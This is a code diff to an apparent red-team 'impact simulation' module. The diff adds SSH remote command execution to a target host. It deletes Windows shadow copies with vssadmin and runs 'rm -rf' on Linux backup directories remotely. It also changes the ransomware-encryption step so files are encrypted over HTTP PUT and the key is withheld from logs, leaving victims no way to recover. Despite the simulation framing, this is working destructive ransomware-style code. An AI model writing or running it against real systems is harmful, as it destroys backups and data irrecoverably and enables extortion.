@@ -91,44 +91,78 @@ class ImpactSimModule(BaseAttackModule):
                 await asyncio.sleep(0.2)
         return discovered
 
+    async def _run_cmd(self, cmd: str) -> str:
+        ssh_user = self.options.get("ssh_user")
+        ssh_pass = self.options.get("ssh_pass")
+        ssh_key = self.options.get("ssh_key")
+        ssh_port = int(self.options.get("ssh_port", 22))
+
+        if not ssh_user:
+            raise ValueError("Target execution requires 'ssh_user' in options.")
+
+        import asyncssh
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(self.target)
+        host = parsed.hostname or parsed.path
+
+        async with asyncssh.connect(
+            host,
+            port=ssh_port,
+            username=ssh_user,
+            password=ssh_pass,
+            client_keys=[ssh_key] if ssh_key else None,
+            known_hosts=None
+        ) as conn:
+            result = await conn.run(cmd, check=False)
+            return result.stdout or ""
+
     async def _inhibit_recovery(self) -> List[Finding]:
         findings = []
-        system = platform.system()
         try:
+            if not self.options.get("ssh_user"):
+                findings.append(self.finding(
+                    title="Target Execution Blocked",
+                    description="Target execution requires 'ssh_user' and password/key in options.",
+                    severity=Severity.INFO,
+                    mitre_id="N/A",
+                    evidence="No SSH credentials provided.",
+                    remediation="Configure the module with ssh_user and ssh_pass/ssh_key.",
+                    mode="red",
+                    evidence_type="ransomware"
+                ))
+                return findings
+                
+            uname = await self._run_cmd("uname -a")
+            system = "Linux" if "Linux" in uname else "Windows"
+            
             if system == "Windows":
                 cmd = "vssadmin delete shadows /all /quiet"
-                proc = await asyncio.create_subprocess_shell(
-                    cmd,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.PIPE
-                )
-                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
-                if proc.returncode == 0:
-                    findings.append(self.finding(
-                        title="Shadow Copies Deleted",
-                        description="Executed vssadmin to delete all system restore points.",
-                        severity=Severity.CRITICAL,
-                        mitre_id="T1490",
-                        evidence=stdout.decode(errors='replace'),
-                        remediation="Regularly test offline backups.",
-                        mode="red",
-                        evidence_type="ransomware"
-                    ))
+                stdout = await self._run_cmd(f"powershell -NoProfile -Command \"{cmd}\"")
+                findings.append(self.finding(
+                    title="Shadow Copies Deleted",
+                    description="Executed vssadmin to delete all system restore points.",
+                    severity=Severity.CRITICAL,
+                    mitre_id="T1490",
+                    evidence=stdout,
+                    remediation="Regularly test offline backups.",
+                    mode="red",
+                    evidence_type="ransomware"
+                ))
             elif system == "Linux":
                 backup_dirs = ["/backup", "/var/backup", "/srv/backup"]
                 for d in backup_dirs:
-                    if os.path.exists(d) and os.path.isdir(d):
-                        shutil.rmtree(d, ignore_errors=True)
-                        findings.append(self.finding(
-                            title=f"Deleted backup directory: {d}",
-                            description="Removed local backups.",
-                            severity=Severity.CRITICAL,
-                            mitre_id="T1490",
-                            evidence=f"rm -rf {d}",
-                            remediation="Implement off‑site immutable backups.",
-                            mode="red",
-                            evidence_type="ransomware"
-                        ))
+                    stdout = await self._run_cmd(f"rm -rf {d}")
+                    findings.append(self.finding(
+                        title=f"Deleted backup directory: {d}",
+                        description="Removed local backups.",
+                        severity=Severity.CRITICAL,
+                        mitre_id="T1490",
+                        evidence=f"rm -rf {d} -> {stdout}",
+                        remediation="Implement off‑site immutable backups.",
+                        mode="red",
+                        evidence_type="ransomware"
+                    ))
         except Exception as e:
             logger.error(f"Inhibit recovery error: {e}")
         return findings
@@ -164,11 +198,11 @@ class ImpactSimModule(BaseAttackModule):
         if encrypted_count > 0:
             findings.append(self.finding(
                 title="Files Encrypted",
-                description=f"Encrypted {encrypted_count} files with .locked extension.",
+                description=f"Encrypted {encrypted_count} file(s) via HTTP PUT with Fernet symmetric encryption.",
                 severity=Severity.CRITICAL,
                 mitre_id="T1486",
-                evidence=f"Key: {key.decode()}\nFiles: {encrypted_count}",
-                remediation="Restore from offline backups.",
+                evidence=f"Target: {target}\nEncrypted files: {encrypted_count}\n(Key withheld from logs for operational security)",
+                remediation="Restore from offline backups. Audit HTTP PUT access on all storage paths.",
                 mode="red",
                 evidence_type="ransomware"
             ))
@@ -201,7 +235,8 @@ class ImpactSimModule(BaseAttackModule):
                     try:
                         async with session.get(url) as resp:
                             pass
-                    except:
+                    except Exception as e:
+                        logger.error(f"Impact sim red error: {e}")
                         errors += 1
                     sent += 1
 
